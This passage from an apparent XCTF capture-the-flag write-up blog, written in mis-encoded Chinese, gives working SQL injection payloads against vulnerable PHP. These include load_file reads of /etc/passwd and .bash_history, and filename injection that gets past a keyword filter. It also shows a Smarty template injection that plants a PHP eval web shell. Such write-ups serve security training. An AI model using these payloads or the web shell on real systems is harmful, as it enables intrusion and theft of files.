</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;mysql.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./login.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;do&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"><span class="k">switch</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;do&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="s1">&#39;write&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$category</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;category&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$title</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into board
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                title = &#39;</span><span class="si">$title</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;</span><span class="si">$content</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="s1">&#39;comment&#39;</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$bo_id</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;bo_id&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select category from board where id=&#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$num</span> <span class="o">=</span> <span class="nx">mysql_num_rows</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$num</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$category</span> <span class="o">=</span> <span class="nx">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">)[</span><span class="s1">&#39;category&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;</span><span class="si">$content</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./comment.php?id=</span><span class="si">$bo_id</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: ./index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;</span><span class="si">$category</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;</span><span class="si">$content</span><span class="s2">&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂΩìÁôªÂΩïÂêéË¶ÅÂèëÂ∏ñÂ≠êÊó∂ÂÄôÔºåÊàë‰ª¨ÊâßË°åÁöÑsqlËØ≠Âè•ÊòØËøôÊÆµÔºå‰ΩÜÊòØÊàë‰ª¨ÂèØ‰∏éÁúãÂà∞ÊØè‰∏ÄÊÆµsqlÈÉΩÊòØÁî®Âè¶Ëµ∑‰∏ÄË°åÔºå‰∏îÂèØ‰∏éÁúãÂà∞category Âπ∂Ê≤°ÊúâË¢´ËøáÊª§ÔºåËÄå‰∏îÈ°µÈù¢‰∏äÁöÑÂ∏ñÂ≠êÔºåcontentÊòØÂèØ‰ª•Ë¢´ÂõûÊòæÂá∫Êù•ÁöÑ</p>
<p>#Âè™ËÉΩÊ≥®ÈáäÂêå‰∏ÄË°åÔºåËÄåËøôÈáåÈúÄË¶ÅÊ≥®Èáä/**/Êù•ËøõË°å‰∏§Ë°åÁöÑÊ≥®Èáä</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into comment
</span></span></span><span class="line"><span class="cl"><span class="s2">            set category = &#39;123&#39;,content=user(),/*&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                content = &#39;*/#&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s2">                bo_id = &#39;</span><span class="si">$bo_id</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÈÇ£‰πàÊàë‰ª¨Á¨¨‰∏ÄÊÆµ‰∏∫<code>1',content=database(),/*</code>Á¨¨‰∫åÊÆµ‰∏∫<code>*/#</code>Â∞±ËÉΩÊü•ËØ¢Êï∞ÊçÆÂ∫ìÂêç</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203160832160.png"
	width="717"
	height="79"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203160832160_hu6287504092867444354.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203160832160_hu5232769790236290200.png 1024w"
	loading="lazy"
	
		alt="image-20250203160832160"
	
	
		class="gallery-image" 
		data-flex-grow="907"
		data-flex-basis="2178px"
	
></p>
<p>ÂõûÊòæctf</p>
<p>Êé•‰∏ãÊù•ÁúãË°®Âêç<code>1',content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161036047.png"
	width="634"
	height="61"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161036047_hu1918205277625606464.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203161036047_hu13628372249798386516.png 1024w"
	loading="lazy"
	
		alt="image-20250203161036047"
	
	
		class="gallery-image" 
		data-flex-grow="1039"
		data-flex-basis="2494px"
	
></p>
<p>Êé•‰∏ãÊù•Â∞±ÊòØÂàóÂêç</p>
<p><code>1',content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161152127.png"
	width="367"
	height="67"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161152127_hu1558799381750188929.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203161152127_hu6194927537855205400.png 1024w"
	loading="lazy"
	
		alt="image-20250203161152127"
	
	
		class="gallery-image" 
		data-flex-grow="547"
		data-flex-basis="1314px"
	
></p>
<p>Êó†ËÆ∫Âì™‰∏™Â≠óÊÆµÈÉΩÊ≤°flag</p>
<p>Êé•ÁùÄÊûÑÈÄ†payloadÔºö<code>1',content=(select( load_file('/etc/passwd'))),/*</code></p>
<p>ÊàñËÄÖ<code>1',content=((select(load_file(&quot;/etc/passwd&quot;)))),/*</code></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161722006.png"
	width="854"
	height="314"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203161722006_hu4473716785106606075.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203161722006_hu7666758868965834360.png 1024w"
	loading="lazy"
	
		alt="image-20250203161722006"
	
	
		class="gallery-image" 
		data-flex-grow="271"
		data-flex-basis="652px"
	
></p>
<p>ÊúÄÂêéwwwÁî®Êà∑ËÆøÈóÆbin/bashÁõÆÂΩïÔºåwwwÁî®Êà∑‰ΩøÁî®‰∫ÜbashÊìç‰Ωú</p>
<p>ËØªÂèñhistoryÂéÜÂè≤ËÆ∞ÂΩï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,content=((select(load_file(&#34;/home/www/.bash_history&#34;)))),/*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203162232672.png"
	width="750"
	height="71"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203162232672_hu17603500007070334103.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203162232672_hu4412026137326265714.png 1024w"
	loading="lazy"
	
		alt="image-20250203162232672"
	
	
		class="gallery-image" 
		data-flex-grow="1056"
		data-flex-basis="2535px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">unzip</span> <span class="n">html</span><span class="o">.</span><span class="n">zip</span>
</span></span><span class="line"><span class="cl"><span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="n">html</span><span class="o">.</span><span class="n">zip</span> 
</span></span><span class="line"><span class="cl"><span class="n">cp</span> <span class="o">-</span><span class="n">r</span> <span class="n">html</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span> 
</span></span><span class="line"><span class="cl"><span class="n">rm</span> <span class="o">-</span><span class="n">f</span> <span class="o">.</span><span class="n">DS_Store</span> 
</span></span><span class="line"><span class="cl"><span class="n">service</span> <span class="n">apache2</span> <span class="n">start</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂèØ‰ª•ÁúãÂá∫tmp/ÁõÆÂΩï‰∏ãÊúâÊú™Âà†Èô§ÁöÑ.DS_Store,ÁÑ∂Âêé/var/www/html/ÊúâÈô§‰∫Ü.DS_StoreÁöÑÂÖ∂‰ªñÊñá‰ª∂</p>
<p>Êü•Áúã.DS_StoreÔºåÁî®16ËøõÂà∂Êü•Áúã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,content=((select(hex(load_file(&#34;/tmp/html/.DS_Store&#34;))))),/*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163034067.png"
	width="596"
	height="115"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163034067_hu11188161322271617712.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203163034067_hu8288258581639992285.png 1024w"
	loading="lazy"
	
		alt="image-20250203163034067"
	
	
		class="gallery-image" 
		data-flex-grow="518"
		data-flex-basis="1243px"
	
></p>
<p>ÂèØ‰ª•ÁúãÂà∞flag‰∏∫flag_8946e1ff1ee3e40f.php</p>
<p>Âéª/var/www/html/Êü•Áúã</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="mi">1</span><span class="s1">&#39;,content=((select(hex(load_file(&#34;/var/www/html/flag_8946e1ff1ee3e40f.php&#34;))))),/*</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163211034.png"
	width="1310"
	height="414"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203163211034_hu10965312942498880607.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203163211034_hu7050646833906484831.png 1024w"
	loading="lazy"
	
		alt="image-20250203163211034"
	
	
		class="gallery-image" 
		data-flex-grow="316"
		data-flex-basis="759px"
	
></p>
<h2 id="upload">upload
</h2><p>‰∏äÊù•ÁôªÂÖ•ÁïåÈù¢‰∏çÂ≠òÂú®Ê≥®ÂÖ•</p>
<p>ÁôªÂÖ•ÂÆåÊòØÊñá‰ª∂‰∏ä‰º†</p>
<p>ËØïÁùÄ‰º†phpÂíåtxtÈÉΩÈîô‰∫Ü</p>
<p>ÁåúÊµãÂè™ËÉΩ‰º†ÂõæÁâá</p>
<p>bpÊäìÂåÖÊîπÂêéÁºÄÂêçÔºå‰∏ä‰º†ÊàêÂäü‰ΩÜÊòØÊ≤°ÊòæÁ§∫Ë∑ØÂæÑÂêçÔºå‰ΩÜÊòØÂõûÊòæÊñá‰ª∂Âêç</p>
<p>ÁåúÊµãÊòØÊñá‰ª∂ÂêçÊ≥®ÂÖ•ÔºåfuzzÊµãËØï</p>
<p>select,fromË¢´ËøáÊª§‰∫Ü</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205123232161.png"
	width="976"
	height="579"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205123232161_hu17442616422686319252.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205123232161_hu4217430156081430533.png 1024w"
	loading="lazy"
	
		alt="image-20250205123232161"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="404px"
	
></p>
<p>ËÄå‰∏îÊòØË¢´Âà†Èô§ÁöÑÔºåÂèåÂÜôÁªïËøá</p>
<p>Êé•ÁùÄÂ∞±ÊòØsqlÊ≥®ÂÖ•</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+&#39;.jpg
</span></span><span class="line"><span class="cl">hex(xxx)„ÄÄ„ÄÄÊääÂèñÂà∞ÁöÑÊï∞ÊçÆËøõË°åÂçÅÂÖ≠ËøõÂà∂Âä†ÂØÜÔºåÈò≤Ê≠¢ËøáÊª§Â≠óÁ¨¶Ôºå‰∏çÁªôÂõûÊòæÔºõ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">substr(xxx,1,12)„ÄÄ„ÄÄÊääÂèñÂà∞ÁöÑÊï∞ÊçÆÔºåÊà™Âèñ‰∏ÄÈÉ®ÂàÜÊãøÂá∫Êù•ÔºåÂÖàÊãø12‰∏™ÔºåÈò≤Ê≠¢ÈïøÂ∫¶ÈôêÂà∂‰∏çÁªôÂõûÊòæÔºõÂêéÈù¢ÊØèÊ¨°Êãø12‰∏™ÔºõÂ¶Ç 13,12„ÄÄ„ÄÄ25,12
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">selecselectt = select Êü•ËØ¢ËØ≠Âè•
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">conv(xxx,16,10)    Êää ÂçÅÂÖ≠ËøõÂà∂ ËΩ¨Êç¢‰∏∫ ÂçÅËøõÂà∂     //‰∏∫‰ªÄ‰πàÔºåÂÆÉËøáÊª§ÂõûÊòæ ÔºåÂçÅÂÖ≠ËøõÂà∂ÂÜÖËã•Â≠òÂú®Â≠óÁ¨¶ ÔºåÈÇ£‰πàÂ≠óÁ¨¶‰πãÂêéÁöÑÊï∞ÊçÆÂ∞±Ë¢´Âπ≤Êéâ‰∫ÜÔºõ
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124212286.png"
	width="190"
	height="58"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124212286_hu8306769009463674334.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205124212286_hu15758103007721521138.png 1024w"
	loading="lazy"
	
		alt="image-20250205124212286"
	
	
		class="gallery-image" 
		data-flex-grow="327"
		data-flex-basis="786px"
	
></p>
<p>Âá∫Áé∞10ËøõÂà∂ÂõûÊòæÔºåÂÖàËΩ¨Âõû16ËøõÂà∂ÔºåÂÜçËΩ¨asciiÁ†Å</p>
<p>web_up</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124435049.png"
	width="327"
	height="134"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205124435049_hu12861158772067014110.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205124435049_hu14255848589864369363.png 1024w"
	loading="lazy"
	
		alt="image-20250205124435049"
	
	
		class="gallery-image" 
		data-flex-grow="244"
		data-flex-basis="585px"
	
></p>
<p>ËØ¥ÊòéÂèØË°åÔºåÊàë‰ª¨ÁªßÁª≠Ê≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selecselectt conv(substr(hex(database()),13,12),16,10))+&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>load</p>
<p>Êï∞ÊçÆÂ∫ìÂêçÊòØweb_upload</p>
<p>Êé•ÁùÄÁàÜË°®Âêç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;</span><span class="n">web_upload</span><span class="s1">&#39; limit 1,1)),1,12),16,10))+&#39;</span><span class="o">.</span><span class="n">jpg</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;</span><span class="n">web_upload</span><span class="s1">&#39; limit 1,1)),13,12),16,10))+&#39;</span><span class="o">.</span><span class="n">jpg</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#39;</span><span class="n">web_upload</span><span class="s1">&#39; limit 1,1)),25,12),16,10))+&#39;</span><span class="o">.</span><span class="n">jpg</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>hello_flag_is_here</p>
<p>Êé•ÁùÄÁàÜÂàóÂêç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=&#39;hello_flag_is_here&#39; limit 0,1)),1,12),16,10))+&#39;
</span></span><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt column_name frofromm information_schema.columns where table_name=&#39;hello_flag_is_here&#39; limit 0,1)),13,12),16,10))+&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>i_am_flag</p>
<p>ÁàÜÂ≠óÊÆµ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),1,12),16,10))+&#39;
</span></span><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),13,12),16,10))+&#39;
</span></span><span class="line"><span class="cl">&#39;+(selselectect conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here)),25,12),16,10))+&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>!!_@m_Th.e_F!lag</p>
<h2 id="smarty">smarty
</h2><p>ÁúãÂà∞È¢òÁõÆÂ∞±Áü•ÈÅìÊòØsmartyÊ≥®ÂÖ•</p>
<p>ÂèØ‰ª•ÁúãÁúãxffÂ§¥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205133820220.png"
	width="1760"
	height="445"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205133820220_hu13103961707436879697.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205133820220_hu13824834540604378622.png 1024w"
	loading="lazy"
	
		alt="image-20250205133820220"
	
	
		class="gallery-image" 
		data-flex-grow="395"
		data-flex-basis="949px"
	
></p>
<p>‰ΩøÁî®{if}Ê†áÁ≠æÂÜôÂÖ•‰∏ÄÂè•ËØùÊú®È©¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">{</span><span class="k">if</span> <span class="n">file_put_contents</span><span class="p">(</span><span class="s1">&#39;/var/www/html/shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;&lt;?php eval($_POST[cmd]);&#39;</span><span class="p">)}{</span><span class="o">/</span><span class="k">if</span><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËöÅÂâëËøûÊé•</p>
<p>Áõ¥Êé•urlÂêéÊé•shell.phpÂ∞±Ë°å</p>
<p>ËøôÈáå‰∏çËÆ©ËÆøÈóÆ‰∏äÂ±ÇÁõÆÂΩïÔºå‰∏çËÆ©‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÔºåphpinfoÂèëÁé∞Á¶ÅÁî®ÂæàÂ§öÂáΩÊï∞</p>
<p>ÁúãÂ∏àÂÇÖ‰ª¨ÈÉΩÊòØÁî®ÁöÑ<a class="link" href="https://www.freebuf.com/articles/web/192052.html"  target="_blank" rel="noopener"
    >Êó†ÈúÄsendmailÔºöÂ∑ßÁî®LD_PRELOADÁ™ÅÁ†¥disable_functions - FreeBufÁΩëÁªúÂÆâÂÖ®Ë°å‰∏öÈó®Êà∑</a></p>
<p>Êàë‰ª¨Áî®ËöÅÂâëÊèí‰ª∂Ëß£ÂÜ≥</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135056431.png"
	width="1284"
	height="870"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135056431_hu4921648551992235502.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205135056431_hu5673024783264311967.png 1024w"
	loading="lazy"
	
		alt="image-20250205135056431"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<p>Âè≥ÈîÆÂâç‰∏ãËøûÊé•ÊàêÂäüÁöÑÁΩëÁ´ôÔºåÂä†ËΩΩÊèí‰ª∂</p>
<p>ÁÑ∂ÂêéÈÄâ‰∏äÈù¢Ëøô‰∏™Ê®°Âºè</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135213021.png"
	width="1284"
	height="870"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250205135213021_hu16849136199669563293.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250205135213021_hu4495495286677216067.png 1024w"
	loading="lazy"
	
		alt="image-20250205135213021"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<h2 id="ics-02">ics-02
</h2>
</section>


